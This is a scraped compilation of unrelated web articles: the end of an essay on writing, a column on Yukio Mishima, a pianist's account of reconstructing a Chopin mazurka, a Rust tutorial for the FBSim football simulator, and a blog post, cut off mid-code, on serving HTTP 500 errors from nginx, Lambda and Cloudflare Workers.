learn something. You are also more likely to look stupid, but that is a price you must be willing to pay.</p><h2 id="iv">IV</h2><p>The inherent fuzziness of conversations makes it difficult to notice gaps in your understanding and reasoning. This applies both to your conversation partner and to yourself.</p><p>Having a conversation with someone else about your ideas is only superior to writing about them under two conditions. First, if you have already thought about your ideas on the topic a lot and have carefully examined your chain of reasoning, which, as I have already explained, is best done in writing. And second, if the other person is smart, has thought about the topic a lot as well, and values truth over consensus. If, and only if, both of these conditions are met, a conversation can be more fruitful in sharpening your ideas than writing about them. There are other advantages to conversations with regards to creativity, thought-provoking impulses, and inspiration, but for thinking deeply about a topic, writing is superior to a conversation.</p><h2 id="v">V</h2><p>Anyone who reads books that are commonly known as <em>the classics</em> will be somewhat discouraged from publishing their writing because these people were so smart. Every idea you come up with has probably been expressed better by someone else (most likely even by Plato because, as some say, <a href="https://www.age-of-the-sage.org/philosophy/footnotes_plato.html">all of western philosophy is merely a series of footnotes to his works</a>). Put differently by Allen Farrington:</p><blockquote>“The classics are classic because those people were a lot smarter than us and we kinda wish they were still around telling the rest of us idiots what to do.”</blockquote><p>Although I whole hardheartedly agree with this sentiment and might one day decide to write up my thoughts on why I think we are “stupider” than our ancestors, it does not have to be demotivating. In fact, it is quite the opposite. Recognizing that our contemporary intellectuals are, let’s just say, “not up for the task” should be a motivation for everyone else. I think the question,</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Have the smart people always been this stupid?</p>— Heather E Heying (@HeatherEHeying) <a href="https://twitter.com/HeatherEHeying/status/1327124783365021696?ref_src=twsrc%5Etfw">November 13, 2020</a></blockquote>

</figure><p>should be answered with a resounding no. We are standing on the shoulders of giants, being mostly unworthy of the great works of the past. But it does not mean that we cannot make ourselves worthy. You (and I) may not possess the courage of Nietzsche or the wisdom of Plato, but it is our responsibility to breathe new life into their thoughts—to think them further—and since they are not around, there is no point in being discouraged.</p><h2 id="vi">VI</h2><p>Do not compare yourself to the classics; they are dead and cannot solve our problems for us. If you need confidence, compare yourself to contemporary intellectuals, and you will see that society needs all the help it can get. Remember, “<a href="https://en.wiktionary.org/wiki/in_the_land_of_the_blind,_the_one-eyed_man_is_king">in the land of the blind, the one-eyed man is king,</a>” and one thing is certain: there are very few two-eyed men left.</p><p>Every time I get disappointed in my ability to think and articulate my thoughts, which happens frequently, I look at contemporary intellectuals and remember Bukowski’s words:</p><blockquote>“I had to continue because they were so bad, not because I was so good; and I’m still not so good, but they’re still very bad.”</blockquote><h2 id="vii">VII</h2><p>This essay is my way of saying: Start writing! You will learn as much about the topic as about yourself. You will be shocked by how often you trick yourself into falsely thinking that you have understood something. You will write and think, “Oh, is this why I think that? I didn’t know that.” </p><p>The process is exciting, challenging, scary, and sometimes painful, but above all, it is worth it. And one day, you and I might be able to read the great works of the past and feel that we have honored their achievements by keeping their ideas alive, and maybe we have even managed to think some of them further.</p><p>Thank you for reading my essay.</p>

			<p>Published in <a href="https://asia.nikkei.com/Editor-s-Picks/Tea-Leaves/Yukio-Mishima-in-the-21st-century" target="_blank">Nikkei Asia 23/11/2020</a></p>
<p>Can you imagine best-selling novelist Haruki Murakami leading a coup attempt against Japanese Prime Minister Yoshihide Suga? Or Booker Prize winner Ian McEwan taking a top general hostage in a British army base and inciting a rebellion against Boris Johnson’s government? Or any of the legions of writers and artists who regularly hammered President Donald Trump on social media choosing to die for their cause?</p>
<p>Probably not, but that would be the modern equivalent of what happened on Nov. 25, 1970, when the brilliant Japanese novelist Yukio Mishima and four accomplices invaded the office of the commander of Japan’s Self-Defense Forces, called on his troops to topple the government of Prime Minister Eisaku Sato, and then committed <em>seppuku</em>, or ritual disembowelment (vulgarly known as <em>hara-kiri</em>).<a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg" alt="NARMishima" width="460" height="612" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-768x1022.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-395x525.jpg 395w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-436x580.jpg 436w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg 1503w" sizes="(max-width: 460px) 100vw, 460px"></a></p>
<p>Mishima had been nominated three times for the Nobel Prize for Literature, but he was not just a writer. He was a major celebrity in Japan, the first to be described as a <em>supasuta</em> (superstar) by the media, and one of the best-known Japanese writers abroad. In the late 1960s the magazine <em>Heibon Punch</em> nominated him the “coolest male” in Japan in its “Mr. Dandy” awards, ahead of movie star Toshiro Mifune and baseball hero Shigeo Nagashima.</p>
<p>Since his shocking suicide, establishment Japan has preferred not to dwell on the “Mishima incident,” and only ultra-rightwing groups have seemed happy to mark the various anniversaries of his death. For the 50th anniversary, though, the vibe has been different. A few days ago, I managed to catch <em>Mishima: The Last Debate</em>, a documentary that uses recently discovered footage of a face-off between Mishima and hundreds of radical students during violent street protests in 1969.</p>
<p>The film was released in March, but was still screening in Tokyo’s central Shibuya district. I half-expected the audience to be dominated by elderly rightists in combat gear. I was wrong. There were women in their 20s and 30s wearing designer masks, some students, ordinary looking couples and solitary intellectual types. Although the film was advertised as a tense confrontation between violence-prone right and violence left-wing groups, the debate was mostly respectful on both sides, with Mishima’s wit drawing gales of laughter from the students and, indeed, the cinema audience.</p>
<p>Other films about Mishima have been made this century. The late Koji Wakamatsu, a radical left sympathizer once known as the “Kurosawa of pink [erotic] movies,” directed <em>11.25: The Day He Chose His Own Fate</em>&nbsp;(2012). This biopic offers a straightforward factual account of Mishima’s last months. There is also a film version of <em>Spring Snow</em>, the first and best volume in his <em>Sea of Fertility</em>&nbsp;tetralogy.</p>
<p>His books are still popular too. Mishima wrote intense, heavyweight novels conveying his philosophical ideas, but also less serious fare as entertainments for the mass market. Interestingly it is the latter that have been doing particularly well these days. A light novel called <em>Yukio Mishima’s Letter Writing Class</em>&nbsp;has consistently ranked in Amazon Japan’s Top 10 for Japanese literature. &nbsp;Another entertainment called <em>Life for Sale</em>&nbsp;was the top seller of 2016 in the Japanese literature department of Kinokuniya, Japan’s largest bookshop, with total sales topping 250,000.</p>

</p><p>At least 30 novels and essays have been translated into English, including <em>Life for Sale</em>. There are also two more biographies. <em>Persona</em>&nbsp;is a meticulously researched doorstopper by Naoki Inose, novelist and ex-governor of Tokyo, and Hiroaki Sato. <em>Yukio Mishima</em>&nbsp;is by British author Damian Flanagan.</p>
<p>Another British Mishima enthusiast was the rock star David Bowie, who appears to have planned his own death in 2016 with Mishima-like artistic precision. Bowie painted a portrait of Mishima, which he hung on the wall of his Berlin apartment in the late 1970s. In the 1990s, he bought a bronze bust of Mishima by British sculptor Sir Eduardo Paolozzi at Sotheby’s.&nbsp; More recently, he referred to the opening of <em>Spring Snow</em>&nbsp;in his 2013 album <em>The Next Day</em>: “Then we saw Mishima’s dog / Trapped between the rocks / Blocking the waterfall.”</p>
<p>The accent on the lighter, more humorous side of Mishima may have contributed to what seems to be a subconscious reassessment within Japan. There is also the fact that some of his political stances — on validating the constitutional status of the Self-Defense Forces, on protecting Japan’s traditional culture — no longer seem extreme.</p>
<p>Another impression came to me forcefully while watching the debate between Mishima and the radical students who were occupying the Tokyo University lecture hall. The cinema audience was agog at the huge moral issues that were being argued in a way that could never happen in today’s world.</p>

</p><p>In his much-misunderstood book, <em>The End of History and the Last Man</em>,&nbsp; Francis Fukuyama uses the ideas of philosopher Friedrich Nietzsche to speculate about what kind of landscape the post-historical “last men” will inhabit, once liberal democracy has triumphed everywhere. The answer is a world devoid of great art, struggle, risk, wisdom and self-knowledge. The last men, Fukuyama posits, “will be concerned above all for personal health and safety … content to sit at home congratulating themselves on their own broadmindedness and lack of fanaticism.”</p>
<p>Mishima’s dislike of Anglo-Saxon liberal democracy came from Nietzsche. According to Flanagan, “Mishima’s bond with Nietzsche was described by Mishima’s father after his son’s death as of an intensity beyond imagination.”</p>
<p>Mishima committed <em>seppuku</em> just 25 years after the end of World War II, much too soon for him to escape being dismissed as an unbalanced reactionary throwback to the age of militarism. Fifty years on, the last man is here, placidly enjoying his lockdown thanks to Zoom, Netflix and Uber Eats, totally comfortable with the prospect of a future controlled by artificial intelligence and big data.</p>
<p>Perhaps we need a Mishima to shock us out of our complacency.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type="text"><p>If someone had told me a decade ago that I was going to produce the first (and, so far, only) published reconstruction of Chopin's posthumous Mazurka in F Minor that includes every uncanceled measure of the composer's sketch, I would have laughed. But apparently when a performance opportunity inspires a research obsession, unexpected things can happen.</p><p>I'm no piano virtuoso, but for some years I've performed chamber music and solo programs on a church recital series. As a student I learned Fauré's B-Minor Nocturne; Scriabin's Preludes, Op. 74; and Scott Joplin's <em data-redactor-tag="em" data-verified="redactor">Magnetic Rag</em>—each of which is its respective composer's last completed composition for solo piano (and in the case of the latter two, the composer's last completed composition). Eventually I had the idea of performing an entire recital of such works, adding Schubert's Sonata in B-flat, D. 960; Schumann's <em data-redactor-tag="em" data-verified="redactor">Ghost Variations</em>; Brahms's <em data-redactor-tag="em" data-verified="redactor">Klavierstücke</em>, Op. 119; and the piece that is generally considered Chopin's last: the Mazurka in F Minor, Op. 68, No. 4.<br></p><p>Of these last completed piano works, the mazurka was the least finished. Chopin customarily composed at the piano, then notated a sketch, and lastly wrote a fair copy. But for the work published posthumously as Op. 68, No. 4, he only got as far as the sketch, a confusing one-page document that was discovered after his death in 1849.<br></p><p>Virtually all editions of the complete Chopin mazurkas include the same sixty-two-bar A–B–A version published in 1855 by former Chopin copyist Julian Fontana, based on a fair copy by cellist Auguste Franchomme, a close friend of the composer and dedicatee of his Cello Sonata. (The Henle edition exactly follows Franchomme's copy, which is more accurate in several respects than Fontana's published version.) But I was aware of a longer version from pianist Arthur Rubinstein's 1967 RCA recording of the complete Chopin mazurkas—a 1965 reconstruction by Polish pianist-musicologist Jan Ekier that adds a C section in F major. I purchased a copy of this A–B–A–C–A version and assumed I'd play it on my recital.<br></p><p>Looking up the work in Maurice Hinson's <em data-redactor-tag="em" data-verified="redactor">Guide to the Pianist's Repertoire,</em> however, I learned of a more complete 1975 reconstruction by British pianist Ronald Smith as published by Hansen House. It turned out to be out of print, but I tracked down a copy via interlibrary loan. The C section in Smith's A–B–A–C–A version is thirtytwo bars, versus sixteen in Ekier's; in his foreword, Smith specifically criticizes Ekier's version, saying that it "takes a disastrous short-cut in the F major episode."<br></p><p>Wondering whether there had been any other published reconstructions, I of course did a Google search, which led me to "Chopin's Last Style," an article by the eminent Chopin authority Jeffrey Kallberg that appeared in the Summer 1985 issue of the <em data-redactor-tag="em" data-verified="redactor">Journal of the American Musicological Society</em> and was republished with slight emendations as a chapter in his 1996 book <em data-redactor-tag="em" data-verified="redactor">Chopin at the Boundaries: Sex, History, and Musical Genre</em>. Kallberg contends that the piece's form is actually A–B–A–C–A–B–A, which struck me as the solution to one riddle in the sketch— the two different versions of the left hand of the B section's last measure (the second version is printed as an ossia passage in the Ekier and Smith editions). It seems likely that one version of that measure is intended for the first B section, the other for the second B.<br></p><p>Kallberg also provides a detailed summary of the various attempts to reconstruct the piece, which in turn led me to two other versions: an edition by Polish composer-pianist Milosz Magin, published in 1983 by Editions Concertino of Paris, and British pianist John Vallier's 1986 edition (now out of print) of a reconstruction by British musicologist Arthur Hedley, who as the first modern scholar to view the sketch in 1951 had discovered the long-missing C section. The thirty-two-bar C section in Magin's A–B–A–C–A version is structurally identical to Smith's. The form of the Hedley-Vallier version is (as Kallberg proposed) A–B– A–C–A–B–A, with the aforementioned slight variation at the end of the second B; but its final A section is oddly truncated, and the thirty-two-bar C section includes material that is clearly crossed out in the sketch.<br></p><p>In "Chopin's Last Style," Kallberg states that "numerous attempts have been made to decipher the document, none entirely successful." Playing through the four published versions, I couldn't help drawing the same conclusion; I could not see performing any of the four verbatim. So I thought I'd put together a composite version, just for my own personal use, incorporating the most convincing readings from the various editions.<br></p><p>But how does one make those decisions? My own sense of musical style, and of Chopin's style in particular, provided a general basis. Ultimately, though, I had to study the sketch itself, a facsimile of which was printed in several of the published editions.</p><p>One of the first spots I examined was a segment that Kallberg cites as having been omitted in previous reconstructions (Ekier, Magin, and Smith all fail to include it): the bass-clef passage that Chopin labeled 3ci (an abbreviation for <em data-redactor-tag="em" data-verified="redactor">trzeci</em>, Polish for "third"). Kallberg's article interprets this segment as the left hand for the transition to the second B section, and the Hedley- Vallier edition adopts that interpretation as well. I took one look at this passage in the sketch and—to my great surprise—drew a completely different conclusion.</p><p>The passage consists of a quarter note and four eighth notes, connected by an ascending slur (the only slur in the entire sketch) that continues up and to the right of the last note; the beam over the eighth notes also continues up and to the right of the last note. To me, this looked like shorthand for an ascending tonic arpeggio that continues upwards (despite the fact that the last notated pitch is a D-flat, which sounds wrong even if the passage is used as a transition to the second A; Kallberg now conjectures that Chopin intended this note to be a C). And the function of the passage seemed clear to me as well: a little extra flourish to distinguish the final iteration of A as the end of the piece. Indeed, the A section ends three different ways—first leading to B, later leading to C, and finally ending the piece—and Chopin specifically labels this ending the "third." (I find it highly unlikely that the passage represents the second A-to-B transition. My examination of all the Chopin sectional dances—the mazurkas, polonaises, and waltzes—reveals that in A–B– A–C–A–B–A rondos where the first and second B sections are in the same key, the second transition from A to B is always identical to the first.)<br></p><p>But the <em data-redactor-tag="em" data-verified="redactor">3ci </em>passage isn't the only sketch segment that is typically omitted. At the end of the C section, Chopin wrote one measure above the staff in (presumably) treble clef and one measure plus a quarter note below the staff in bass clef. Ekier, Smith, and Magin include the former but omit the latter; Hedley-Vallier includes the latter but omits the former. No previous reconstruction had included every measure of the sketch that Chopin had not crossed out. So I made up my mind that my version would be the first—and this required figuring how to incorporate both these segments at the end of the C section. Thinking more as a composer than as a musicologist, I came up with a solution that seemed to make musical sense.<br></p><p>Barely had I drawn these conclusions than I began to question how I could have solved riddles that had stumped a whole series of eminent Chopin specialists. So first I sent my reconstruction to an esteemed scholar who has dealt extensively with another composer's manuscripts. She was quite encouraging, as were the other editors and teachers I then asked to review my work. Eventually I got up the nerve to send my version to Jeffrey Kallberg himself, who responded, "You've solved a number of puzzling passages that have eluded other researchers, including myself (I'm thinking especially of your very sensible rendition of measure 95 [the end of the C section])." He also generously provided a great deal of critical feedback that led to numerous improvements in both my reconstruction and the accompanying editorial notes.<br></p><p>By this time, I realized that my version might well be of interest to other pianists and scholars, so I began submitting it for publication, and fortunately Richard Walters of Hal Leonard decided to issue it as part of that company's Schirmer Performance Editions series. It appeared in print in 2012—the year after I gave its premiere performance on my last-completed-pianoworks recital.<br></p><p>All music schools try to link performance and scholarship. But sometimes, by pure serendipity, one leads seamlessly to the other—and then back again.<br></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I took a two week vacation in early November. Somehow I decided to spend it learning a bit more about <a href="https://www.rust-lang.org/">Rust</a> and Reinforcement Learning (RL), a sub-field of AI that I haven’t explored much before. We won’t be talking about RL this post, though. That’s for a future blogpost.</p>



<p> All of that lead to me writing <a rel="noreferrer noopener" href="https://github.com/IanTayler/fbsim" target="_blank">FBSim</a><sup>1</sup>, which I struggled to describe as <em>“a game-like football simulation environment for trying out AI ideas, written in Rust</em>“. As a game-dev framework, I used <a href="https://amethyst.rs/">amethyst</a>. Rust, amethyst and FBSim are all open source.</p>



<p>The idea is the following: you write functions defining how each of your players are to behave according to their role (forward, left, right, defender and goalie)<sup>2</sup> and according to the environment, which includes information about the position of every teammate, every opponent, the ball and the net. FBSim does the rest for you.</p>



<p>In Rust terms, all you need to do in order to make your own AI for the game and see it play against other AIs is to implement the <code>Engine</code> <em>trait</em> –a trait is like a <code>protocol</code> in swift, an <code>interface</code> in Go, or an <code>Abstract Base Class</code> in python: essentially, a set of methods–, then you register your engine and change the configuration to make the players use it.</p>



<p>We’ll be implementing a simple AI for FBSim from scratch later on in the blogpost (beginners to Rust are welcome too), but first let me show you how the game looks like.</p>



<p>These are two very simple stock AIs playing each other.</p>



<figure><div>
<p><span><iframe width="1100" height="619" src="https://www.youtube.com/embed/OGKFFvp1zzA?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div><figcaption><code>BasicWingWait</code> <em>detroying </em><code>Basic</code> on a game</figcaption></figure>



<p>Exciting? <em>No? </em>Well… uhh… it’s a bit more exciting if you write the AI yourself.</p>



<p>Let’s go ahead with the implementation.</p>



<h2>Get (to) the sources</h2>



<p>First, let’s download the source code, and checkout the tag for the code that’s compatible with this blogpost.</p>



<pre><code>git clone git@github.com:IanTayler/fbsim.git
cd fbsim
git checkout blogpost-1b # APIs may change in the future!</code></pre>



<h2>Get Rust (if necessary)</h2>



<p>If you have Rust and <code>cargo</code> installed, you’re ready to go ahead. If not, then you should check out <code><a href="https://rustup.rs/">rustup</a></code>. Once you’ve installed <code>rustup</code>, and used it to install the compiler (I’m using 1.47.0) and <code>cargo</code>, you’re good to go.</p>



<p><strong>Note: </strong>FBSim uses <code>const fn</code> with a <code>match</code> statement, so you will need a relatively new version of the Rust compiler. If you’re getting errors mentioning <code>const fn</code> and <code>match</code>, then you probably need to update your compiler to a newer version.</p>



<h2>Build FBSim</h2>



<h3>Linux</h3>



<p>In order for amethyst to work, you should first install some system dependencies, as detailed <a href="https://github.com/amethyst/amethyst#dependencies">here</a>. Install the dependencies according to your distribution and then you can proceed to run the following.</p>


<pre title="">source ./env.sh # necessary due to a rendy bug with vulkan
cargo run
</pre>


<h3>MacOS</h3>



<p>If you’re under macOS, you first need to change the <code>Cargo.toml</code> to use <code>metal</code> instead of <code>vulkan</code>.</p>



<p>Your final Cargo.toml file should look like this:</p>


<pre title="">[package]
name = "fbsim"
version = "0.1.0"
authors = ["Ian Tayler &lt;iangtayler@gmail.com&gt;"]
edition = "2018"
readme = "README.md"
repository = "https://github.com/IanTayler/fbsim/"
license = "MIT"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies.amethyst]
version = "0.15.3"
features = ["metal"]

[dependencies.serde]
version = "1.0.104"

[dependencies]
rand = "0.7.0"
rand_distr = "0.3.0"
</pre>


<p>Now, you can save the file and run:</p>


<pre title="">cargo run
</pre>


<p>I didn’t test this on a mac, so these instructions are based on speculation. Let me know if it doesn’t work for you.</p>



<p><strong>Note: </strong>It was brought to my attention that some people were having <a href="https://github.com/gfx-rs/gfx/issues/2309#issuecomment-506130902">the following issue</a> mentioning <code>gfx-backend-metal</code> and <code>xcrun</code> on macOS. If that’s you, follow the linked issue to get a likely solution.</p>



<h3>Windows</h3>



<p>I think the simple <code>cargo run</code> should work by itself under windows. Let me know if that’s not the case!</p>



<h2>Checking that it works</h2>



<p>If it works, you should see something like the following screenshot. The players should be moving about. Some of them could be standing still. That’s normal.</p>

<h2>What an FBSim Engine is</h2>



<p>What we’re going to do now is to implement a new <code>Engine</code> and try it out against one of the stock ones.</p>



<p>Implementing an <code>Engine</code> amounts to implementing a bunch of functions that take as input a representation of the state of the game, and output a description of how the agent should behave next frame.</p>



<p>In essence, we’ll be telling our players what to do based on what they can see.</p>



<h3>Engine input</h3>



<p>As input we’ll get an <code>EngineData</code> struct. Here is how it’s defined.</p>


<pre title="">/// Input for engine functions.
pub struct EngineData&lt;'a&gt; {
    pub ball_position: Vector2&lt;f32&gt;,
    pub own_position: Vector2&lt;f32&gt;,
    pub own: &amp;'a player::Player,
    pub own_type: &amp;'a player::PlayerType,
    pub own_net_position: Vector2&lt;f32&gt;,
    pub opponent_net_position: Vector2&lt;f32&gt;,
    pub teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
    pub opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
}

</pre>


<p>If you’re new to Rust. You can ignore the <code>'a</code>. It’s a <a href="https://doc.rust-lang.org/nomicon/lifetimes.html">lifetime</a> parameter. The rest should look somewhat familiar if you’ve used languages like C, C++, Go, etc. All the <code>pub</code>s just mean we want the fields and the struct to be publicly exported. Let’s look at the fields we actually care about.</p>



<p><code>ball_position: Vector2&lt;f32&gt;</code></p>



<p>This will have the <em>absolute</em> position of the ball –(0, 0) is the lower left of the screen–. You can access each coordinate by using <code>Vector2</code>‘s <code>x</code> and <code>y</code> fields. <code>Vector2</code>s also have special methods defined and most operations (<code>+</code>, <code>-</code>, <code>*</code>) behave like you’d expect if you’ve worked with <code>numpy</code> and similar libraries. </p>



<p>The actual <code>Vector2</code> type is defined in the <code><a href="https://docs.rs/nalgebra/0.18.0/nalgebra/">nalgebra</a></code> crate<sup>3</sup>. The <code>&lt;f32&gt;</code> part just means the values in each coordinate are 32bit floats.</p>


<pre title="">own_position: Vector2&lt;f32&gt;,
</pre>


<p>Same as above, but this will have the currently-running player’s position.</p>


<pre title="">own_net_position: Vector2&lt;f32&gt;,
opponent_net_position: Vector2&lt;f32&gt;,
</pre>


<p>You get the idea, right? Positions of the centers of both nets. <code>opponent_net</code> is where <em>you</em> are trying to score. These are also <em>always</em> absolute positions, so they will be the same value every time.</p>


<pre title="">teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
</pre>


<p>Here we have a vector (<code>Vec</code>, similar to C++’s vectors, python’s lists, etc.) having the positions of all your 4 teammates (in the case of <code>teammates_position</code>) or the positions of your 5 opponents (in the case of <code>opponents_position</code>); along with the respective role of each of those opponents or teammates –each element is a pair with role first and position later–. We will not be using these two fields for the rest of this post, but if you plan on implementing a good engine, you probably should.</p>



<h3>Engine output</h3>


<pre title="">/// Return type of engine functions.
pub struct EngineTransition {
    /// Velocity vector (pixels per second). Magnitude will
    /// be cropped to player speed!
    pub velocity: Vector2&lt;f32&gt;,
    /// Which action to activate (if any).
    pub action: Option&lt;player::ActionType&gt;,
}
</pre>


<p>This is what our functions will return. We define our player’s velocity in the x and y axis, and we set the player’s action, if any.</p>



<p>The <code>action</code> field will be either <code>Some(ActionType::Kick)</code> if we want our player to kick the ball if it collides with them next frame and <code>None</code> if we want the player to gently push the ball forward.<sup>4</sup> There are no other actions in this version of FBSim.</p>



<h3>Engine trait (i.e. methods)</h3>


<pre title="">pub trait Engine {
    fn goalie(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn forward(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn left(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn defender(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn right(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn dispatch(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition {
        match engine_data.own_type {
            PlayerType::Goalie =&gt; self.goalie(engine_data),
            PlayerType::Defender =&gt; self.defender(engine_data),
            PlayerType::Forward =&gt; self.forward(engine_data),
            PlayerType::Left =&gt; self.left(engine_data),
            PlayerType::Right =&gt; self.right(engine_data),
        }
    }   
}

</pre>


<p>What this says is we need to implement methods called <code>goalie</code>, <code>defender</code>, <code>left</code>, <code>right</code> and <code>forward</code>. Each will govern how each of our roles play. The <code>dispatch</code> method is already implemented by default, and it’s unlikely you’ll want to change it.</p>



<p>The only difference between roles is the position they start on in the field after each goal and the fact that goalies have a bigger hitbox.</p>



<h3>SimpleEngine trait</h3>



<p>When convenient, you can use <code>SimpleEngine</code>, which only asks that you implement an <code>engine_func</code> method and implements all the <code>Engine</code> methods for you.</p>



<p>This can be useful when you will use exactly the same code for <em>all </em>your roles. You just write that code once in <code>engine_func</code> and <code>SimpleEngine</code> uses it for <code>goalie</code>, <code>left</code>, <code>right</code>, etc. indistinctly.</p>


<pre title="">pub trait SimpleEngine {
    fn engine_func(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
}
</pre>


<p>This is what we’ll be using. But you’ll likely want to have different methods for your different roles if you implement something more complex.</p>



<h2>Implementation</h2>



<h3>Minimal Engine implementation</h3>



<p>We’ll create a file <code>src/engines/myengine.rs</code>. That’s where our entire engine will live.</p>



<p>We’ll first create the silliest engine possible: we’ll always stay put and not do any actions. Later we’ll make a less silly engine.</p>


<pre title="">// src/engines/myengine.rs
//
// First import everything we need.
// "crate" are imports relative to our own code.
// So crate::components is under src/components, for example.
use crate::{        
    components::player::ActionType,
    engines::{EngineData, EngineTransition, SimpleEngine},
};                      
                    
// We don't need any fields. We just define an empty struct.
pub struct MyEngine;    

// We use `impl` to implement the `SimpleEngine` trait.
impl SimpleEngine for MyEngine {
    fn engine_func(&amp;mu…</pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>A few days ago I built a new website, though calling it such might be a touch too generous. It’s called <em>500 as a Service</em> or <em>500aaS</em> for short. You can visit it on <a href="https://500asaservice.com/">500asaservice.com</a>. Don’t sue me if you find it disappointing. It’s meant to be a failure after all.</p> <p>I figured, with the wealth of things available to consume as a service nowadays, it felt just appropriate to altruistically offer a piece of failure on-demand, free of charge, to my fellow humans. I know, I may have probably peaked with this idea right here.</p> <p>Take it for what you may, but I probably got more out of building this website than you, dear reader, after contemplating it in befuddlement. I didn’t set out to build a lazy failure, mind you. I wanted to build a massively scalable one. And this poses a somewhat more interesting challenge. How did I do it?</p>  <p>The vision for 500aaS is as follows:</p> <blockquote> <p>Provide a planet-scale, elastic, resilient, secure and low-latency on-demand HTTP 500 service.</p> </blockquote> <p>Planet-scale, elastic… those couple of buzzword bingo entries hint at a cloud service… AWS maybe? Correct! (it was the <em>elastic</em> part that gave it away, wasn’t it?). In times past, the simplest way to deploy a site like this would’ve been to get hold of a server box somewhere, set up Apache or Nginx on it and configure the web server to always return 500 errors, regardless of the URL pattern it receives. Open this server up to the public Internet via a static IP address and voila: you got yourself a homemade failure.</p> <div><div><pre><code># Minimal nginx config that will get you 500 responses forever
# /etc/nginx.conf
events {}

http {
    server {
        location / {
            return 500;
        }
    }
}
</code></pre></div></div> <p>But there is a big caveat here. This is just one physical server we’re talking about. What if 500aaS took off big time and people started swarming onto my site, anxiously seeking their daily fix of foobar? The server could become overwhelmed, unable to even muster the processing power to serve a <em>faux</em> HTTP 500, and start returning real ones, if at all. You could argue this is technically still OK, as the whole point of 500aaS is to fail, but I’m a bit of a purist, so I coudn’t accept that possibility. The question remains then: how do I deploy a service like this so that it can serve endless botched responses in a controlled manner, to anyone, under any circumstances? By taking it to the cloud, of course!</p> <p>The easiest, most scalable way to host a site on AWS is to build it on top of their serverless stack: Lambda, DynamoDB… My application doesn’t need any state to remember it should be always serving a 500 response back so all I need is a simple Lambda function to run it. One like this maybe:</p> <div><div><pre><code><span>const</span> <span>fs</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>fs</span><span>'</span><span>);</span>

    <span>return</span> <span>response</span><span>;</span>
<span>};</span>
</code></pre></div></div> <p>I want to return an error with the minimum amount of complexity and effort possible. Turns out it’s actually pretty hard to cause a Lambda function to truly crash, so I manually craft the 500 status codes instead. Is this cheating? Maybe, but it’s not like a user of this service would care. They just want to see a 500 error page, for God’s sake!</p> <p>Despite the simplicity of its implementation, this approach would still require me setting up an API Gateway as a frontend, which is good but not very cheap in the long run, and not entirely hassle-free. There is another option, and that is to serve the content as close as possible to the location it was requested from, and generating said response directly where it’s served. Does this sound like I’m talking about a CDN? Because that’s exactly what I’m talking about.</p> <p>If you’ve never come across this approach before, several cloud vendors and CDN providers let you ship your code directly to the servers at their edge points of presence, which means the client-server exchange journey is remarkably shortened. Instead of having the CDN as the middle-man that caches the content served from the actual web servers, the CDN now becomes <strong>the</strong> server. Wait a minute, aren’t CDNs just dumb caches serving static Internet files all over the planet? Well, not anymore! You can now run arbitrary code in them too which allows them to modify Internet payloads running through them on the fly, as well as generating new content dynamically!</p> <p>The first major vendor I know of that started offering this were Cloudflare, with <a href="https://workers.cloudflare.com/">Cloudflare Workers</a>. Workers have evolved a fair bit as a technology since they were first launched a few years ago. You can deploy pretty useful applications straight to their CDN using JavaScript or WASM, which unlocks Rust and even COBOL! The <a href="https://developers.cloudflare.com/workers/about/how-it-works/">technology</a> that enables this is pretty interesting but beyond the scope of this article. Anyway, getting started with Cloudflare Workers is fairly easy nowadays. Here’s a sample Worker JS script I put together:</p> <div><div><pre><code><span>addEventListener</span><span>(</span><span>'</span><span>fetch</span><span>'</span><span>,</span> <span>event</span> <span>=&gt;</span> <span>{</span>
  <span>event</span><span>.</span><span>respondWith</span><span>(</span><span>handleRequest</span><span>(</span><span>event</span><span>.</span><span>request</span><span>));</span>
<span>});</span>
<span>/**
 * Respond with HTTP 500
 * @param {Request} request
 */</span>
<span>async</span> <span>function</span> <span>handleRequest</span><span>(</span><span>request</span><span>)</span> <span>{</span>
  <span>const</span> <span>htmlBody</span> <span>=</span> <span>`
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;500 - Internal Server Error&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;500&lt;/h1&gt;
        &lt;h2&gt;Internal Server Error&lt;/h2&gt;
    &lt;/body&gt;
&lt;/html&gt;
`</span><span>;</span>
  <span>return</span> <span>new</span> <span>Response</span><span>(</span><span>htmlBody</span><span>,</span> <span>{</span>
    <span>status</span><span>:</span> <span>500</span><span>,</span>
